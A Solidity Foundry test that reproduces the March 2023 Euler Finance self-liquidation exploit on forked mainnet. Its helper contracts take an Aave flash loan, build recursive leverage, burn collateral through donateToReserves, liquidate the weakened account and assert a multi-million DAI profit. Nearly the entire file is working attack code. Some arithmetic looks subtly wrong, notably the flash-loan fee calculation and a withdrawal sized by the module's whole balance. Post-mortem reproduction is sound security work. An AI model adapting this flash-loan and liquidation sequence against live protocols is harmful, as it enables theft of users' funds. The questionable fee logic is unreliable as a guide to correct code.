// SPDX‑License‑Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

/**
 * @title  Euler Finance ‑ self‑liquidation exploit (13‑Mar‑2023)
 * @author ImmuneBytes
 * @notice Reproduces main‑net tx 0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
 * @dev    Sequence: flash‑loan → leverage loop → donateToReserves → self‑liquidate → repay loan.
 * @see    https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
 * @see    BlockSec, PeckShield, SlowMist post‑mortems on 13‑Mar‑2023
 */

// --------------------------------------------------------------------------
//  Minimal interfaces
// --------------------------------------------------------------------------

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEuler {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;

    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory);
}

interface IAaveFlashLoan {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// --------------------------------------------------------------------------
//  Address book (kept internal to avoid extra files)
// --------------------------------------------------------------------------

library Addresses {
    address internal constant DAI             = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant EDAI_TOKEN      = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address internal constant DDAI_TOKEN      = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
    address internal constant EULER_MAIN      = 0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34;
    address internal constant EULER_MODULE    = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address internal constant AAVE_V2_LENDING = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
}

// --------------------------------------------------------------------------
//  Exploit roles
// --------------------------------------------------------------------------

/**
 * @notice LeverageBomb builds an over‑leveraged position and triggers the vulnerable donate.
 */
contract LeverageBomb {
    using Addresses for *;

    IERC20  private constant DAI  = IERC20(Addresses.DAI);
    EToken  private constant eDAI = EToken(Addresses.EDAI_TOKEN);
    DToken  private constant dDAI = DToken(Addresses.DDAI_TOKEN);

    /**
     * @dev Arms the leverage bomb: deposit, recursive mint, partial repay, second mint,
     *      then donateToReserves to force health < 1.
     */
    function arm() external {
        // Unlimited approval – safe in forked test; DO NOT copy to prod.
        DAI.approve(Addresses.EULER_MODULE, type(uint256).max);

        // 1. Deposit 20M DAI as collateral.
        eDAI.deposit(0, 20_000_000 ether);

        // 2. Borrow‐and‐redeposit loop to reach ≈11× leverage.
        eDAI.mint(0, 200_000_000 ether);

        // 3. Repay 10M DAI to tweak health‑factor before second loop.
        dDAI.repay(0, 10_000_000 ether);

        // 4. Second leverage surge.
        eDAI.mint(0, 200_000_000 ether);

        // 5. The critical mis‑check: burn 100M eDAI without health validation.
        eDAI.donateToReserves(0, 100_000_000 ether);
    }
}

/**
 * @notice DiscountBuyer performs the liquidation of the attacked account then withdraws collateral.
 */
contract DiscountBuyer {
    using Addresses for *;

    IERC20  private constant DAI  = IERC20(Addresses.DAI);
    EToken  private constant eDAI = EToken(Addresses.EDAI_TOKEN);
    IEuler  private constant Euler = IEuler(Addresses.EULER_MAIN);

    /**
     * @dev Executes `liquidate()` and forwards profit to the test harness.
     */
    function execute(address violator, address receiver) external {
        IEuler.LiquidationOpportunity memory opp = Euler.checkLiquidation(
            address(this), violator, Addresses.DAI, Addresses.DAI
        );

        Euler.liquidate(violator, Addresses.DAI, Addresses.DAI, opp.repay, opp.yield);

        // Withdraw seized collateral from Euler and send to receiver (the test contract).
        eDAI.withdraw(0, DAI.balanceOf(Addresses.EULER_MODULE));
        DAI.transfer(receiver, DAI.balanceOf(address(this)));
    }
}

// --------------------------------------------------------------------------
//  Main test contract
// --------------------------------------------------------------------------

contract EulerExploitTest is Test {
    using Addresses for *;

    IERC20  private constant DAI  = IERC20(Addresses.DAI);
    IAaveFlashLoan private constant Aave = IAaveFlashLoan(Addresses.AAVE_V2_LENDING);

    LeverageBomb  private bomb;
    DiscountBuyer private buyer;

    // Config struct keeps magic numbers transparent.
    struct ExploitConfig {
        uint256 flashAmount;   // 30M DAI
        uint256 expectedProfit;// lower‑bound profit assertion
    }

    ExploitConfig private cfg;

    function setUp() public {
        // Fork three blocks before exploit.
        vm.createSelectFork("mainnet", 16_822_130);

        cfg = ExploitConfig({
            flashAmount:     30_000_000 ether,
            expectedProfit:   8_000_000 ether
        });
    }

    function test_EulerSelfLiquidation() public {
        // Prepare arrays for Aave flash‑loan.
        address[] memory assets  = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes   = new uint256[](1);
        assets[0]  = Addresses.DAI;
        amounts[0] = cfg.flashAmount;
        modes[0]   = 0; // full repayment at end of tx

        bytes memory params = ""; // not needed; we handle state locally.

        // Kick off flash‑loan; control returns in executeOperation.
        Aave.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
    }

    /// @dev Aave callback – this is where the exploit really happens.
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        require(msg.sender == Addresses.AAVE_V2_LENDING, "Only Aave can call");

        // Deploy helper actors.
        bomb  = new LeverageBomb();
        buyer = new DiscountBuyer();

        // Hand all borrowed DAI to the bomb and arm it.
        DAI.transfer(address(bomb), cfg.flashAmount);
        bomb.arm();

        // Perform the liquidation and capture profit in this contract.
        buyer.execute(address(bomb), address(this));

        // ─── Assertions ────────────────────────────────────────────────────────
        uint256 profit = DAI.balanceOf(address(this)) - cfg.flashAmount;
        assertGt(profit, cfg.expectedProfit, "profit below expectation");

        // ─── Repay Aave loan plus fee ──────────────────────────────────────────
        uint256 fee = amounts[0] * premiums[0] / 1e4 + premiums[0];
        DAI.approve(Addresses.AAVE_V2_LENDING, amounts[0] + fee);
        return true;
    }
}
